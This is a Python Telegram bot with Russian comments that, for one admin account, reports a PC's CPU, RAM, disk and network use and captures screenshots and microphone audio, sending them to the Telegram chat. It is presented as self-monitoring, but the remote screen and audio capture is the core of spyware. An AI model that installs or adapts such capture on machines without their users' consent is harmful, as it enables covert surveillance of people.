import datetime
import io
import time
import threading
import pyautogui
import sounddevice as sd
import scipy.io.wavfile as wav
import psutil
import telebot
from telebot import types
from config import TOKEN, ID

# токен бота
TOKEN = TOKEN

# в конфиг вставь свой айди аккаунта
ADMIN_ID = ID

bot = telebot.TeleBot(TOKEN)


# функции сбора данных
def get_cpu_usage():
  # процент загрузки процессора
  return psutil.cpu_percent(interval=1)


def get_ram_usage():
  # процент использования оперативки
  mem = psutil.virtual_memory()
  return mem.percent


def get_disk_usage():
  # процент использования диска
  disk = psutil.disk_usage("/")
  return disk.percent


def get_network_traffic():
  # сетевой трафик отправлено получено в мб
  net = psutil.net_io_counters()
  sent_mb = net.bytes_sent / (1024 * 1024)
  recv_mb = net.bytes_recv / (1024 * 1024)
  return f"отправлено: {sent_mb:.2f} mb\n получено: {recv_mb:.2f} mb"


def take_screenshot():
  # делает скриншот экрана и сохраняет в памяти
  screenshot = pyautogui.screenshot()
  bio = io.BytesIO()
  bio.name = "screenshot.png"
  screenshot.save(bio, "PNG")
  bio.seek(0)
  return bio


def record_audio(duration):
  # запись звука с микрофона в течение указанных секунд
  fs = 44100
  audio = sd.rec(int(duration * fs), samplerate=fs, channels=2)
  sd.wait()
  bio = io.BytesIO()
  bio.name = "audio.wav"
  wav.write(bio, fs, audio)
  bio.seek(0)
  return bio


# старт с защитой
@bot.message_handler(commands=["start", "help"])
def send_welcome(message):
  # проверка айди
  if message.from_user.id != ADMIN_ID:
    bot.reply_to(message, "у тебя нет доступа к этому боту")
    return

  bot.reply_to(
      message,
      "привет, я бот который следит за твоим пк\n"
      "отправь команду /status, и я скажу все что знаю о твоем пк\n",
  )


@bot.message_handler(commands=["status"])
def send_status(message):
  # проверка айди
  if message.from_user.id != ADMIN_ID:
    bot.reply_to(message, "доступ запрещен")
    return

  # вызовы
  cpu = get_cpu_usage()
  ram = get_ram_usage()
  disk = get_disk_usage()
  network = get_network_traffic()

  # создание отчета
  report = (
      "📊 **вот что я знаю о тебе**\n\n"
      f"💻 **cpu:** {cpu}%\n"
      f"🧠 **ram:** {ram}%\n"
      f"💾 **диск:** {disk}%\n"
      f"🌐 **трафик:**\n{network}\n\n"
      f"🕒 *время отчета:* {datetime.datetime.now().strftime('%H:%M:%S')}"
  )

  # создаем кнопки 
  markup = types.InlineKeyboardMarkup()
  btn_screenshot = types.InlineKeyboardButton(
      "сделать скриншот", callback_data="menu_screenshot"
  )
  btn_audio = types.InlineKeyboardButton(
      "записать звук", callback_data="menu_audio"
  )
  markup.add(btn_screenshot, btn_audio)

  bot.reply_to(message, report, parse_mode="Markdown", reply_markup=markup)


# меню выбора времени для скриншота
@bot.callback_query_handler(func=lambda call: call.data == "menu_screenshot")
def menu_screenshot(call):
  if call.from_user.id != ADMIN_ID:
    bot.answer_callback_query(call.id, "доступ запрещен", show_alert=True)
    return

  markup = types.InlineKeyboardMarkup()
  markup.add(
      types.InlineKeyboardButton("сейчас", callback_data="shot_0"),
      types.InlineKeyboardButton("через 3 сек", callback_data="shot_3"),
      types.InlineKeyboardButton("через 5 сек", callback_data="shot_5"),
  )
  bot.edit_message_reply_markup(
      call.message.chat.id, call.message.message_id, reply_markup=markup
  )
  bot.answer_callback_query(call.id, "выбери задержку")


# меню выбора времени для записи звука
@bot.callback_query_handler(func=lambda call: call.data == "menu_audio")
def menu_audio(call):
  if call.from_user.id != ADMIN_ID:
    bot.answer_callback_query(call.id, "доступ запрещен", show_alert=True)
    return

  markup = types.InlineKeyboardMarkup()
  markup.add(
      types.InlineKeyboardButton("5 секунд", callback_data="audio_5"),
      types.InlineKeyboardButton("10 секунд", callback_data="audio_10"),
      types.InlineKeyboardButton("20 секунд", callback_data="audio_20"),
  )
  bot.edit_message_reply_markup(
      call.message.chat.id, call.message.message_id, reply_markup=markup
  )
  bot.answer_callback_query(call.id, "выбери длительность записи")


# обработка задержки скриншота
@bot.callback_query_handler(func=lambda call: call.data.startswith("shot_"))
def handle_screenshot_delay(call):
  if call.from_user.id != ADMIN_ID:
    bot.answer_callback_query(call.id, "доступ запрещен", show_alert=True)
    return

  delay = int(call.data.split("_")[1])
  bot.answer_callback_query(call.id, f"скриншот через {delay} сек")
  bot.edit_message_reply_markup(call.message.chat.id, call.message.message_id, reply_markup=None)

  if delay > 0:
    time.sleep(delay)

  photo = take_screenshot()
  bot.send_photo(
      call.message.chat.id,
      photo,
      caption=f"вот скриншот задержка {delay} сек:",
  )


# обработка записи звука
@bot.callback_query_handler(func=lambda call: call.data.startswith("audio_"))
def handle_audio_record(call):
  if call.from_user.id != ADMIN_ID:
    bot.answer_callback_query(call.id, "доступ запрещен", show_alert=True)
    return

  duration = int(call.data.split("_")[1])
  bot.answer_callback_query(call.id, f"записываю звук {duration} сек")
  bot.edit_message_reply_markup(call.message.chat.id, call.message.message_id, reply_markup=None)

  # записываем в отдельном потоке чтобы не вешать бота
  def send_voice():
    audio_file = record_audio(duration)
    bot.send_voice(call.message.chat.id, audio_file, caption=f"запись звука {duration} сек:")

  threading.Thread(target=send_voice).start()


# helloworld("print")
if __name__ == "__main__":
  # запущено
  print("запущено")
  bot.infinity_polling()